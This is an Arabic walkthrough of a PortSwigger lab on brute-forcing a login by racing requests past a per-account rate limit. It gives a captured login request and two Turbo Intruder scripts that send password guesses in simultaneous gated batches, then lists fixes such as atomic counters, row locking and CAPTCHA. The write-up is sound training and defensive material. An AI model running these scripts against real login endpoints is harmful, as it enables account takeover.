# [Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)

## **`الهدف`**
القيام بعمل `brute-force` علي كلمة المرور الخاصة بحساب `carlos` باستخدام قائمة كلمات المرور المتوفرة في صفحة اللاب وتسجيل الدخول بنجاح إلى حسابه ثم التوجه إلى لوحة التحكم وحذف حساب `carlos`، ولكن يجب تخطي الـ `rate limit` الموجود، مع مراعاة أن اللاب يتم إغلاقه بعد `15` دقيقة وستحتاج إلى البدئ مرة أخرى وستتغير كلمة المرور.
## **`خطوات الحل`**
**`ملاحظة هامة:`** إذا حاولت تسجيل الدخول `3` مرات خاطئة فإنه يتم منع من محاولة الدخول لهذا الحساب مرة أخرى لمدة `60` ثانية، ولكن مع ذلك إذا قمت بعد ذلك بمحاولة دخول خاطئة لحساب أخر فستمر بشكل طبيعى وهذا يعنى أن الحظر يتم على مستوى الحساب وليس على مستوى الـ `Session`.

أولا سنقوم بتسجيل الدخول إلى حساب `carlos` بأى كلمة مرور عشوائية ونقوم باعتراض الطلب وتحويله إلى `Turbo Intruder`
```http
POST /login HTTP/2
Host: 0a16003103764ed184605ac100b00002.web-security-academy.net
Cookie: session=earh92vAGFLn49lyiuQqz45FBw3bklOS

csrf=nHZkOwDth7l5rWkwBpHBJRdvl3abigo3&username=carlos&password=test
```

ثم نقوم بوضع `%s` بجانب `current=`، بعد ذلك سنقوم بإنشاء ملف نصي ونضع به جميع كلمات المرور التي يوفرها لنا اللاب لنجربها.

ونستعمل السكريبت التالي:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )

    batch_size = 30  # حجم المجموعة في كل بوابة
    count = 0

    with open(r'C:\Users\test\Desktop\test.txt', 'r') as f:
        for line in f:
            word = line.strip()
            if not word:
                continue

            # وضع الطلب في البوابة الحالية
            engine.queue(target.req, word, gate=str(count // batch_size))
            count += 1

    # حساب عدد البوابات الفعلية التي تحتوي على طلبات
    total_gates = (count + batch_size - 1) // batch_size

    # فتح البوابات التي تم إنشاؤها فقط
    for i in range(total_gates):
        engine.openGate(str(i))
        
def handleResponse(req, interested):
    table.add(req)
```

ولكن سنلاحظ أنه بعد `14` طلب خاطئ تقريبًا نحتاج إلى الإنتظار لمدة `60` قبل إعادة المحاولة لذلك سنحتاج إلى العودة إلى الملف النصي وحذف الـ `14` كلمة التي تم استعمالهم ثم إعادة المحاولة، وربما من الأسهل تقسيم كلمات المرور من البداية على ملفين كل ملف `14` كلمة فقط لتسهيل إعادة المحاولة.

أو يمكن استعمال هذا السكريبت الموجود في الحل الرسمي والذي يقوم بنقل كلمات المرور الـ `Clipboard` الخاصة بك، ولكن كذلك ستحتاج لتقسميهم على عدة مرات أو ستضطر إلى العودة وحذف الذي تم استخدامه وأخذ البقية فقط `Copy` ليتم وضعهم في الـ `Clipboard`
```Python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

وسنجد أن إحدى كلمات المرور تمت الإستجابة عليها بـ `302` فنقوم بتسجيل الدخول بها إلى حساب `carlos` ثم نتوجه إلى لوحة التحكم ونحذف حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب استخدام العمليات الذرية حيث أن هذا هو الحل البرمجي الأفضل، فبدلاً من قراءة العداد ثم تحديثه في خطوتين برمجيتين منفصلتين، يجب استخدام أنظمة تدعم العمليات الذرية، حيث أن العملية الذرية تعني أن قراءة العداد وزيادته تحدث كحركة واحدة لا يمكن لأي طلب آخر التداخل معها، وذلك عن طريق استخدام تقنيات مثل `Redis` لإدارة الـ`Rate Limiting`، حيث يمكن استخدام أمر `INCR` الذي يقوم بزيادة العداد وإرجاع القيمة الجديدة في خطوة واحدة `Atomic`، مما يمنع ثغرات الـ `Race Condition` تماماً.

ويجب استخدام قفل السجل `Row-level Locking` الخاص بالمستخدم أثناء معالجة الطلب إذا كان التطبيق يعتمد على قاعدة بيانات علائقية `SQL` لتسجيل عدد المحاولات الخاطئة.

ويجب تطبيق قيود معدل الطلبات على مستوى الـ `WAF` أو الـ `Load Balancer` مثل `Nginx` أو `Cloudflare`، فهذه الأدوات مبرمجة بلغات منخفضة المستوى ومصممة خصيصاً للتعامل مع آلاف الطلبات المتزامنة بدقة شديدة ولن تنخدع بهجوم الـ `Race Condition`، على العكس من  الاعتماد فقط على كود التطبيق `Application Layer` لصد هجمات الـ` Brute-force`، حيث أنه غالباً ما يكون عرضة لمشاكل التزامن.

ويجب أن يُطلب من المستخدم حل كابتشا `(CAPTCHA)` بعد كل محاولتين أو ثلاث خطأ لإثبات أنه إنسان وليس اداة.
